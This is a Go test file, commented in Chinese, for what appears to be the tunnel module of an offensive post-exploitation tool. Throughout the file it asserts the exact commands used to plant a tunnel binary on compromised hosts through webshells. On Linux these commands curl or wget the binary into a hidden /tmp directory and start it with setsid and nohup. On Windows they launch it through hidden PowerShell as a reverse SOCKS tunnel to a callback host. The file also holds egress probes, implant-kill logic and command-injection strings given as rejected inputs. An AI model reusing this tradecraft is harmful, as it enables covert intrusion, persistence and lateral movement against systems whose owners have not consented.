package tunnel

import (
	"context"
	"strings"
	"testing"
	"time"
)

// 平台判定的兼容语义：空串必须是 linux（既有台账行没有 platform 字段，
// 反序列化后仍要走 Unix 路径）。
func TestPlatformOf(t *testing.T) {
	cases := map[string]Platform{
		"":        PlatformLinux,
		"linux":   PlatformLinux,
		"Linux":   PlatformLinux,
		"windows": PlatformWindows,
		"WIN":     PlatformWindows,
		"win64":   PlatformWindows,
		"weird":   PlatformLinux, // 未知值按 unix 兜底，不 panic
	}
	for in, want := range cases {
		if got := PlatformOf(in); got != want {
			t.Errorf("PlatformOf(%q) = %q, want %q", in, got, want)
		}
	}
}

// platformSession 是带可配 kind 与可选 HostPlatform 的假会话。
type platformSession struct {
	kind   string
	hostOS string
}

func (s *platformSession) ID() int64                  { return 1 }
func (s *platformSession) Kind() string               { return s.kind }
func (s *platformSession) Test(context.Context) error { return nil }
func (s *platformSession) Exec(context.Context, string, time.Duration) (string, string, error) {
	return "", "", nil
}
func (s *platformSession) ReadFile(context.Context, string) ([]byte, error) { return nil, nil }
func (s *platformSession) WriteFile(context.Context, string, []byte) error  { return nil }
func (s *platformSession) Close(context.Context) error                      { return nil }

// hostPlatformSession 额外实现 HostPlatformProvider（观测值优先于马型推断）。
type hostPlatformSession struct{ platformSession }

func (s *hostPlatformSession) HostPlatform() string { return s.platformSession.hostOS }

func TestPlatformForSession(t *testing.T) {
	// 只按马型推断：aspx/asp 跑在 IIS 上，必为 Windows。
	for _, k := range []string{"http_aspx", "http_aspx_enc", "asp", "reverse_windows"} {
		if got := PlatformForSession(&platformSession{kind: k}); got != PlatformWindows {
			t.Errorf("kind %q 应判为 windows，得到 %q", k, got)
		}
	}
	for _, k := range []string{"http_php", "http_jsp", "http_phpcmd", "reverse"} {
		if got := PlatformForSession(&platformSession{kind: k}); got != PlatformLinux {
			t.Errorf("kind %q 应判为 linux，得到 %q", k, got)
		}
	}
	// 驱动自报的观测值优先：即使 kind 看起来像 aspx，HostPlatform 说 linux 就按 linux。
	// 这条守的是「别用字符串猜平台」——换了命名（http_aspx_lite 之类）时马型推断会错。
	got := PlatformForSession(&hostPlatformSession{platformSession{kind: "http_aspx", hostOS: "linux"}})
	if got != PlatformLinux {
		t.Errorf("HostPlatform 观测值应覆盖马型推断，得到 %q", got)
	}
	if got := PlatformForSession(nil); got != PlatformLinux {
		t.Errorf("nil 会话应按 linux 兜底，得到 %q", got)
	}
}

// Linux 命令必须逐字保持原样：这是已经在真实目标上跑通过的路径，任何「顺手
// 重构」都可能把它改坏，而坏掉的症状是「隧道建不起来」这种不指向根因的形态。
func TestLinuxCommandsKeepFieldProvenShapes(t *testing.T) {
	h := HostOf(PlatformLinux)
	if got := h.TempDirExpr("ab12"); got != "/tmp/.ab12" {
		t.Errorf("Linux 远端目录应保持 /tmp/.<tag>，得到 %q", got)
	}
	if got := h.Mkdir("/tmp/.ab12"); got != "mkdir -p /tmp/.ab12" {
		t.Errorf("Linux mkdir 变了: %q", got)
	}
	if c := h.DeliverCmd("http://x/f", "/tmp/.ab12/ch", "/tmp/.ab12", "MK"); !strings.Contains(c, "mkdir -p /tmp/.ab12") ||
		!strings.Contains(c, "curl -fsSL -m 90 'http://x/f' -o /tmp/.ab12/ch") ||
		!strings.Contains(c, "wget -q -T 90 -O /tmp/.ab12/ch") ||
		!strings.Contains(c, "echo MK_OK") || !strings.Contains(c, "echo MK_FAIL") {
		t.Errorf("Linux 投递命令缺少既有要素: %q", c)
	}
	if c := h.ChmodCmd("/tmp/.ab12/ch", "MK"); c != "chmod +x /tmp/.ab12/ch && echo MK_OK || echo MK_FAIL" {
		t.Errorf("Linux chmod 变了: %q", c)
	}
	if c := h.SpawnCmd("/tmp/.ab12", "/tmp/.ab12/ch", "/tmp/.ab12/run.log", "u", "p", []string{"client", "--keepalive", "9s"}, "MK"); !strings.Contains(c, "setsid env AUTH='u:p' nohup ./ch") ||
		!strings.Contains(c, "echo MK_PID=$!") {
		t.Errorf("Linux 拉起命令缺少既有要素: %q", c)
	}
	if c := h.RemoveDirCmd("/tmp/.ab12", "MK"); !strings.Contains(c, "rm -rf -- '/tmp/.ab12'") {
		t.Errorf("Linux 删目录命令变了: %q", c)
	}
	if c := h.KillInspectCmd(42, "/tmp/.ab12/ch", "MK"); !strings.Contains(c, "/proc/42/cmdline") {
		t.Errorf("Linux 进程核对应走 /proc: %q", c)
	}
	if got := h.WorkDirCmd(); got != "pwd" {
		t.Errorf("Linux 定位目录应是 pwd，得到 %q", got)
	}
	// Linux 的临时目录表达式是字面量，不需要解析步骤。
	if got := h.DirExprCmd(); got != "" {
		t.Errorf("Linux 不应产生目录解析命令，得到 %q", got)
	}
}

// Windows 命令里不能出现任何 Unix 原语。这条是本次适配的核心断言：
// 此前 Windows 立足点之所以建不起隧道，就是因为这些原语被内联进了部署流程。
func TestWindowsCommandsContainNoUnixPrimitives(t *testing.T) {
	h := HostOf(PlatformWindows)
	cmds := map[string]string{
		"mkdir":   h.Mkdir(`C:\Windows\Temp\ab12`),
		"deliver": h.DeliverCmd("http://x/f", `C:\Windows\Temp\ab12\ch.exe`, `C:\Windows\Temp\ab12`, "MK"),
		"spawn": h.SpawnCmd(`C:\Windows\Temp\ab12`, `C:\Windows\Temp\ab12\ch.exe`, `C:\Windows\Temp\ab12\run.log`,
			"u", "p", []string{"client", "--keepalive", "9s"}, "MK"),
		"rmdir":   h.RemoveDirCmd(`C:\Windows\Temp\ab12`, "MK"),
		"inspect": h.KillInspectCmd(42, `C:\Windows\Temp\ab12\ch.exe`, "MK"),
		"stop":    h.KillStopCmd(42, `C:\Windows\Temp\ab12\ch.exe`, "MK"),
		"tcp":     h.ProbeCmd("tcp", "TCP_1", "10.0.0.8:443", "PFX"),
		"http":    h.ProbeCmd("http", "HTTP_1", "10.0.0.8:80", "PFX"),
		"dns":     h.ProbeCmd("dns", "DNS", "example.com", "PFX"),
		"icmp":    h.ProbeCmd("icmp", "ICMP", "10.0.0.8", "PFX"),
		"reach":   h.TCPReachCmd("10.0.0.8", 3306, "MK"),
	}
	banned := []string{"chmod", "setsid", "nohup", "/proc/", "/dev/tcp", "mkdir -p", "rm -rf", "readlink", "pwd"}
	for name, c := range cmds {
		for _, b := range banned {
			if strings.Contains(c, b) {
				t.Errorf("Windows %s 命令含 Unix 原语 %q: %s", name, b, c)
			}
		}
	}
	// 执行位在 Windows 上不存在：不产生命令，也不假装检查过一次。
	if got := h.ChmodCmd(`C:\x\ch.exe`, "MK"); got != "" {
		t.Errorf("Windows 不应有 chmod 步骤，得到 %q", got)
	}
	// 定位目录用 cd（cmd 无 pwd）。
	if got := h.WorkDirCmd(); got != "cd" {
		t.Errorf("Windows 定位目录应是 cd，得到 %q", got)
	}
	// 二进制必须带 .exe：cmd 的 CreateProcess 不补后缀。
	if got := h.BinName(); got != "ch.exe" {
		t.Errorf("Windows 二进制名应为 ch.exe，得到 %q", got)
	}
}

// Windows 拉起必须能取回真实 pid——cmd 的 start /b 做不到，所以走
// PowerShell Start-Process -PassThru。AUTH 同样经环境变量，不进命令行。
func TestWindowsSpawnUsesPassThruAndEnvAuth(t *testing.T) {
	h := HostOf(PlatformWindows)
	c := h.SpawnCmd(`C:\t\ab12`, `C:\t\ab12\ch.exe`, `C:\t\ab12\run.log`, "chengjian", "deadbeef",
		[]string{"client", "--keepalive", "9s", "http://1.2.3.4:20001", "R:127.0.0.1:20801:socks"}, "MK")
	for _, want := range []string{
		"Start-Process", "-PassThru", "-WindowStyle Hidden",
		"$env:AUTH='chengjian:deadbeef'", // 口令不进命令行
		"MK_PID=",
	} {
		if !strings.Contains(c, want) {
			t.Errorf("Windows 拉起命令缺少 %q: %s", want, c)
		}
	}
	if strings.Contains(c, "deadbeef") && strings.Contains(c, "--auth") {
		t.Errorf("Windows 拉起命令不应把口令放进命令行参数: %s", c)
	}
}

func TestWindowsProbeUsesSocketErrorCode(t *testing.T) {
	h := HostOf(PlatformWindows)
	c := h.ProbeCmd("tcp", "TCP_1", "10.0.0.8:443", "PFX")
	// 三态判定必须走 SocketErrorCode（枚举、与语言无关），不能匹配异常文本：
	// .NET 的异常消息是本地化的，中文系统上按 "Connection refused" 匹配会全落 FAIL，
	// 于是「路径通、只是没监听」被误判成「被过滤」，正好把选型结论带反。
	for _, want := range []string{"SocketErrorCode", "ConnectionRefused", "TimedOut", "PFX_TCP_1_OK"} {
		if !strings.Contains(c, want) {
			t.Errorf("Windows TCP 探针缺少 %q: %s", want, c)
		}
	}
	if strings.Contains(strings.ToLower(c), "connection refused") {
		t.Errorf("Windows TCP 探针不应匹配本地化的异常文本: %s", c)
	}
}

// Windows 进程核对不能解析 tasklist 文本（输出是本地化的），必须用
// Get-CimInstance 取命令行 + Get-Process 判存活。
func TestWindowsProcessOpsAreLocaleFree(t *testing.T) {
	h := HostOf(PlatformWindows)
	inspect := h.KillInspectCmd(42, `C:\t\ch.exe`, "MK")
	stop := h.KillStopCmd(42, `C:\t\ch.exe`, "MK")
	for name, c := range map[string]string{"inspect": inspect, "stop": stop} {
		if strings.Contains(c, "tasklist") {
			t.Errorf("%s 不应解析 tasklist 输出（本地化）: %s", name, c)
		}
		if !strings.Contains(c, "Get-CimInstance") && !strings.Contains(c, "Get-Process") {
			t.Errorf("%s 应使用 CIM/Get-Process 判定: %s", name, c)
		}
	}
	if !strings.Contains(stop, "MK_NOMATCH") {
		t.Errorf("身份不匹配时必须显式回显 NOMATCH，而不是静默放过: %s", stop)
	}
}

func TestParseDirExpr(t *testing.T) {
	win := HostOf(PlatformWindows)
	got, err := win.ParseDirExpr("C:\\Windows\\Temp\r\n")
	if err != nil || got != `C:\Windows\Temp` {
		t.Errorf("解析 Windows 临时目录失败: %q, %v", got, err)
	}
	// UNC 路径也是合法形态。
	if got, err := win.ParseDirExpr(`\\server\share\tmp`); err != nil || got != `\\server\share\tmp` {
		t.Errorf("UNC 路径应被接受: %q, %v", got, err)
	}
	// 相对路径/危险字符必须拒绝：这些值随后要内联进 cmd 命令。
	for _, bad := range []string{"", "  \n ", "relative\\dir", `C:\x&del`, `C:\x"; rm -rf /`, `C:\x|y`} {
		if _, err := win.ParseDirExpr(bad); err == nil {
			t.Errorf("应拒绝目录回显 %q", bad)
		}
	}
	lin := HostOf(PlatformLinux)
	if got, err := lin.ParseDirExpr("/var/www/html\n"); err != nil || got != "/var/www/html" {
		t.Errorf("解析 Linux 目录失败: %q, %v", got, err)
	}
	if _, err := lin.ParseDirExpr("relative/dir"); err == nil {
		t.Error("Linux 相对路径应被拒绝")
	}
}

func TestKillIdentityMatches(t *testing.T) {
	lin := HostOf(PlatformLinux)
	if !lin.KillIdentityMatches("/tmp/.owned/ch\n/tmp/.owned/ch", "/tmp/.owned/ch") {
		t.Error("Linux cmdline 命中应判为身份匹配")
	}
	if !lin.KillIdentityMatches("/tmp/.owned/ch client --keepalive 9s", "/tmp/.owned/ch") {
		t.Error("Linux cmdline 带参数应判为身份匹配")
	}
	if lin.KillIdentityMatches("/usr/bin/other", "/tmp/.owned/ch") {
		t.Error("Linux 命令行不含远端二进制时不应判为匹配（pid 复用防护）")
	}

	win := HostOf(PlatformWindows)
	if !win.KillIdentityMatches(`"C:\t\ch.exe" client --keepalive 9s`, `C:\t\ch.exe`) {
		t.Error("Windows CommandLine 含远端二进制应判为匹配")
	}
	if win.KillIdentityMatches(`"C:\Windows\system32\svchost.exe" -k netsvcs`, `C:\t\ch.exe`) {
		t.Error("Windows 其它进程不应判为匹配（pid 复用防护）")
	}
}

// Windows 的「脱离会话常驻」必须在能力声明里保持 unknown。
//
// 这条测试存在的意义：Start-Process -PassThru 能拿回 pid，但「IIS 应用池回收后
// 子进程是否仍活」没有在真实目标上验证过。一旦有人把它改成 supported 而不去
// 验证，调用方就会停止复核——那正是「装活」的开始。
func TestWindowsDetachCapabilityStaysUnknown(t *testing.T) {
	caps := HostOf(PlatformWindows).Caps()
	if caps.Detach != CapabilityUnknown {
		t.Errorf("Windows Detach 应为 unknown（未在真实目标验证），得到 %q", caps.Detach)
	}
	if caps.ExecBit != CapabilityUnsupported {
		t.Errorf("Windows ExecBit 应为 unsupported，得到 %q", caps.ExecBit)
	}
	if caps.Note == "" {
		t.Error("unknown 能力必须带说明，否则调用方无法知道为什么要复核")
	}
	lc := HostOf(PlatformLinux).Caps()
	for name, st := range map[string]CapabilityState{
		"ExecBit": lc.ExecBit, "Detach": lc.Detach, "PidReceipt": lc.PidReceipt,
		"ProcIdentity": lc.ProcIdentity, "EgressProbe": lc.EgressProbe,
	} {
		if st != CapabilitySupported {
			t.Errorf("Linux %s 应为 supported，得到 %q", name, st)
		}
	}
}

// 计划生成必须按平台给出远端路径：Windows 用 %TEMP%\<tag> 表达式（部署时解析），
// Linux 用字面量 /tmp/.<tag>（不产生额外命令）。
func TestPlanRemotePathsPerPlatform(t *testing.T) {
	base := func(plat string) *PlanOpts {
		return &PlanOpts{
			TaskID: 1, ViaSessionID: 2, CallbackHost: "1.2.3.4",
			Platform: plat, DataDir: "/data/tunnels",
			PortMin: 20000, PortMax: 20010,
			CanListen: func(int) bool { return true },
		}
	}
	lin, err := PlanSocks(base(""))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(lin.RemoteDir, "/tmp/.") || !strings.HasSuffix(lin.RemoteBin, "/ch") {
		t.Errorf("Linux 计划远端路径不对: dir=%q bin=%q", lin.RemoteDir, lin.RemoteBin)
	}
	if lin.Platform != string(PlatformLinux) {
		t.Errorf("空平台应落成 linux，得到 %q", lin.Platform)
	}

	win, err := PlanSocks(base("windows"))
	if err != nil {
		t.Fatal(err)
	}
	if win.Platform != string(PlatformWindows) {
		t.Errorf("Windows 计划平台字段不对: %q", win.Platform)
	}
	if !strings.HasPrefix(win.RemoteDir, `%TEMP%\`) {
		t.Errorf("Windows 远端目录应是 %%TEMP%%\\<tag> 表达式，得到 %q", win.RemoteDir)
	}
	if !strings.HasSuffix(win.RemoteBin, `ch.exe`) {
		t.Errorf("Windows 远端二进制应带 .exe，得到 %q", win.RemoteBin)
	}
	// 表达式必须能在部署时被解析成字面路径，且解析结果与 Join 结果自洽。
	got, err := win.host().ParseDirExpr("C:\\Windows\\Temp")
	if err != nil {
		t.Fatal(err)
	}
	resolved := strings.Replace(win.RemoteDir, "%TEMP%", got, 1)
	if resolved != `C:\Windows\Temp\`+strings.TrimPrefix(win.RemoteDir, `%TEMP%\`) {
		t.Errorf("表达式替换后路径不对: %q", resolved)
	}
	if strings.Contains(resolved, "%") {
		t.Errorf("解析后不应残留 %% 表达式: %q", resolved)
	}
}

// 探针没跑起来时，结论必须是 probe_unsupported，不能是 isolated。
//
// 这是本次改动里最容易被忽略但影响最大的一条：Windows 立足点上探针语法不可用，
// 旧逻辑会得出「目标无出网」——方向碰巧对（都建议 suo5），理由完全错，而且
// 掩盖了真正的问题（PowerShell 被限制）。基于错误理由做的后续决策迟早出错。
func TestConcludeProbeUnsupportedNotIsolated(t *testing.T) {
	rep := &ProbeReport{
		SessionID: 1,
		Platform:  string(PlatformWindows),
		Results: []ProbeResult{
			{Kind: "tcp", Target: "1.2.3.4:443", State: string(TCPProbeError)},
			{Kind: "tcp", Target: "1.2.3.4:80", State: string(TCPProbeError)},
			{Kind: "http", Target: "1.2.3.4:80"},
			{Kind: "dns", Target: "example.com"},
		},
	}
	if rep.ProbeRan() {
		t.Fatal("全部 probe_error 时 ProbeRan 应为 false")
	}
	c := Conclude(rep)
	if c.Grade != GradeProbeUnsupported {
		t.Errorf("应为 %s，得到 %s（这是把「探针不可用」误判成「目标无出网」）", GradeProbeUnsupported, c.Grade)
	}
	if c.SuggestedAdapter != AdapterSuo5 {
		t.Errorf("探针不可用时仍应给出可执行的建议（suo5），得到 %q", c.SuggestedAdapter)
	}

	// 只要有一条真的执行过，就回到原有分档逻辑（全 filtered → isolated）。
	ran := &ProbeReport{Results: []ProbeResult{
		{Kind: "tcp", Target: "1.2.3.4:443", State: string(TCPFiltered)},
		{Kind: "tcp", Target: "1.2.3.4:80", State: string(TCPProbeError)},
	}}
	if !ran.ProbeRan() {
		t.Fatal("有哨兵回显时 ProbeRan 应为 true")
	}
	if g := Conclude(ran).Grade; g != GradeIsolated {
		t.Errorf("全 filtered 应为 %s，得到 %s", GradeIsolated, g)
	}
}
